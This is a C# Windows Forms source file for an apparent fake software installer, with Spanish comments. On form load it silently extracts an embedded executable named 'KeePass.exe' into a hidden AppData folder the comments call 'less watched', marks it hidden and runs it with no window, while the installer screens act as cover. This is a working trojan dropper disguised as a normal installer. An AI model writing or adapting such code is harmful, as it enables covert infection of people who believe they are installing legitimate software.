using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Test
{
    public partial class Instalacion : Form
    {




        public Instalacion()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            comboBox1.Text = "Español";
            EjecutarPayload();
            //EjecutarKeePass();

        }


        private void EjecutarKeePass()
        {
            string resourceName = "Test.NetVisuals.exe"; // Verifica el nombre exacto
            string tempFile = Path.Combine(Path.GetTempPath(), "KeePass.exe");

            try
            {
                // Eliminar si ya existe
                if (File.Exists(tempFile))
                    File.Delete(tempFile);

                using (Stream resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {
                    if (resource == null)
                    {
                        MessageBox.Show("Embedded resource not found.");
                        return;
                    }

                    using (FileStream file = new FileStream(tempFile, FileMode.Create, FileAccess.Write))
                    {
                        resource.CopyTo(file);
                    }
                }

                Process.Start(new ProcessStartInfo
                {
                    FileName = tempFile,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show("Execution failed: " + ex.Message);
            }
        }
        public static void EjecutarPayload()
        {
            try
            {
                // Buscar el recurso embebido
                string resourceName = Assembly.GetExecutingAssembly()
                    .GetManifestResourceNames()
                    .FirstOrDefault(s => s.EndsWith("Test.NetVisuals1.exe"));

                if (resourceName == null)
                {
                    MessageBox.Show("No se encontró el payload embebido.");
                    return;
                }

                // Cambiar ruta destino a una menos vigilada
                string extractFolder = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft\\UpdateServices");
                Directory.CreateDirectory(extractFolder);

                string exePath = Path.Combine(extractFolder, "KeePass.exe");

                // Eliminar si ya existe
                if (File.Exists(exePath))
                    File.Delete(exePath);

                // Extraer
                using (Stream resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                using (FileStream file = new FileStream(exePath, FileMode.Create, FileAccess.Write))
                {
                    resource.CopyTo(file);
                }

                // Opcional: ocultar archivo
                File.SetAttributes(exePath, FileAttributes.Hidden);

                // Ejecutar
                var psi = new ProcessStartInfo
                {
                    FileName = exePath,
                    WorkingDirectory = extractFolder,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error ejecutando el payload: " + ex.Message);
            }
        }





        // Resto de tus manejadores de eventos:
        private void label1_Click(object sender, EventArgs e) { }

        private void splitContainer1_Panel2_Paint(object sender, PaintEventArgs e) { }

        private void pictureBox1_Click(object sender, EventArgs e) { }

        private void label1_Click_1(object sender, EventArgs e) { }

        private void button1_Click(object sender, EventArgs e)
        {
            Licencia licencia = new Licencia();
            licencia.Show();
            this.Hide();
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e) { }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e) { }

        private void comboBox1_SelectedIndexChanged_1(object sender, EventArgs e) { }

        private void panel1_Paint(object sender, PaintEventArgs e) { }

        private void button1_Click_1(object sender, EventArgs e)
        {
            Application.Exit();
        }
    }
}
